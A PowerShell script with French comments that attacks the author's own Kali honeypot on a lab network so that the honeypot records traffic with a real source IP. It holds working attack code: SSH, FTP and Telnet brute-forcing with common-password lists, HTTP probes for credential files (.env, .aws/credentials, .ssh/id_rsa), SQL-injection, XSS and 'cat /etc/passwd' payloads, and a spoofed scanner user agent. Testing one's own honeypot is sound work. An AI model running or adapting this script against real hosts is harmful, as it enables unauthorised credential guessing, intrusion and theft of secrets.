<#
.SYNOPSIS
  Batterie d'attaques depuis Windows (192.168.56.1) contre le honeypot Kali
  (192.168.56.104), pour générer des événements avec une VRAIE IP source
  distante, distincte de la passerelle Docker (cf. docs/attribution-ip-source.md).

.DESCRIPTION
  Couvre les 4 services. Utilise plink (SSH avec mot de passe scripté), du raw
  TCP (FTP/Telnet) et HTTP (Invoke-WebRequest). Aucun nmap requis.

.EXAMPLE
  powershell -ExecutionPolicy Bypass -File attacks/run_attacks_windows.ps1
  powershell -ExecutionPolicy Bypass -File attacks/run_attacks_windows.ps1 -Target 192.168.56.104 -Tries 30
#>
param(
  [string]$Target = "192.168.56.104",
  [int]$SshPort = 22,
  [int]$HttpPort = 8080,
  [int]$FtpPort = 21,
  [int]$TelnetPort = 23,
  [int]$Tries = 25
)

$ErrorActionPreference = "SilentlyContinue"
$pwds = @(
  "123456","password","admin","root","123456789","qwerty","12345678","111111",
  "1234567","dragon","letmein","monkey","abc123","iloveyou","000000","password1",
  "qwerty123","admin123","root123","toor","welcome","changeme","P@ssw0rd","master",
  "superman","trustno1","baseball","football","shadow","michael"
) | Select-Object -First $Tries
$users = @("root","admin","user","ftp","test","oracle")

function Send-RawTcp {
  param([string]$H,[int]$P,[string[]]$Lines,[int]$ReadMs = 500)
  try {
    $c = New-Object System.Net.Sockets.TcpClient
    if (-not $c.ConnectAsync($H,$P).Wait(1500)) { return $false }
    $s = $c.GetStream(); $s.ReadTimeout = $ReadMs
    $buf = New-Object byte[] 4096
    Start-Sleep -Milliseconds 120
    try { $s.Read($buf,0,$buf.Length) | Out-Null } catch {}
    foreach ($l in $Lines) {
      $b = [Text.Encoding]::ASCII.GetBytes($l + "`r`n")
      $s.Write($b,0,$b.Length); $s.Flush()
      Start-Sleep -Milliseconds 90
      try { $s.Read($buf,0,$buf.Length) | Out-Null } catch {}
    }
    $c.Close(); return $true
  } catch { return $false }
}

Write-Host "=== Batterie d'attaques Windows -> $Target ===" -ForegroundColor Cyan

# --- 1. SSH bruteforce (plink, mot de passe scripté) -----------------------
Write-Host "[1] SSH bruteforce ($SshPort)" -ForegroundColor Yellow
$plink = (Get-Command plink -ErrorAction SilentlyContinue).Source
if (-not $plink) { $plink = "C:\Program Files\PuTTY\plink.exe" }
$sshN = 0
if (Test-Path $plink) {
  # 1er appel : mettre la clé d'hôte en cache (répond 'y' automatiquement)
  "y`n" | & $plink -ssh -P $SshPort -l root -pw firstcache $Target exit 2>$null | Out-Null
  foreach ($p in $pwds) {
    $u = $users | Get-Random
    echo y | & $plink -ssh -batch -P $SshPort -l $u -pw $p $Target "exit" 2>$null | Out-Null
    $sshN++
  }
  Write-Host "    $sshN tentatives SSH envoyées" -ForegroundColor DarkGray
} else {
  Write-Host "    plink introuvable -> SSH ignoré" -ForegroundColor Red
}

# --- 2. HTTP scan (chemins sensibles + payloads) ---------------------------
Write-Host "[2] HTTP scan ($HttpPort)" -ForegroundColor Yellow
$paths = @(
  "/","/admin","/login","/wp-login.php","/wp-admin/","/phpmyadmin/","/.env",
  "/.git/config","/config.php","/server-status","/robots.txt","/shell.php",
  "/.aws/credentials","/api/v1/users","/backup.zip","/db.sql","/index.php",
  "/admin.php","/.ssh/id_rsa","/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
  "/?id=1' OR '1'='1","/?q=<script>alert(1)</script>","/?cmd=cat%20/etc/passwd",
  "/cgi-bin/test.cgi","/manager/html","/solr/admin/","/struts2-showcase/"
)
$ua = "Mozilla/5.0 (compatible; Nikto/2.5.0) sqlmap/1.7"
$httpN = 0
foreach ($path in $paths) {
  try {
    Invoke-WebRequest -Uri "http://${Target}:${HttpPort}$path" -UserAgent $ua `
      -TimeoutSec 4 -UseBasicParsing -MaximumRedirection 0 | Out-Null
  } catch {}
  $httpN++
}
Write-Host "    $httpN requêtes HTTP envoyées" -ForegroundColor DarkGray

# --- 3. FTP bruteforce (une session, multiples USER/PASS) ------------------
Write-Host "[3] FTP bruteforce ($FtpPort)" -ForegroundColor Yellow
$ftpLines = @()
foreach ($p in $pwds) { $ftpLines += "USER admin"; $ftpLines += "PASS $p" }
$ftpLines += "QUIT"
$ftpOk = Send-RawTcp -H $Target -P $FtpPort -Lines $ftpLines
Write-Host ("    session FTP: {0} ({1} tentatives)" -f ($(if($ftpOk){"OK"}else{"échec"}), $pwds.Count)) -ForegroundColor DarkGray

# --- 4. Telnet bruteforce (plusieurs connexions) ---------------------------
Write-Host "[4] Telnet bruteforce ($TelnetPort)" -ForegroundColor Yellow
$tnN = 0
foreach ($p in ($pwds | Select-Object -First 12)) {
  $u = $users | Get-Random
  if (Send-RawTcp -H $Target -P $TelnetPort -Lines @($u,$p,"ls -la","cat /etc/passwd")) { $tnN++ }
}
Write-Host "    $tnN sessions Telnet" -ForegroundColor DarkGray

Write-Host ""
Write-Host "=== Terminé. Vérifier le dashboard Kali : http://${Target}:3000 ===" -ForegroundColor Cyan
Write-Host "    (l'IP source 192.168.56.1 doit apparaître/croître dans 'Top IP sources')" -ForegroundColor DarkGray
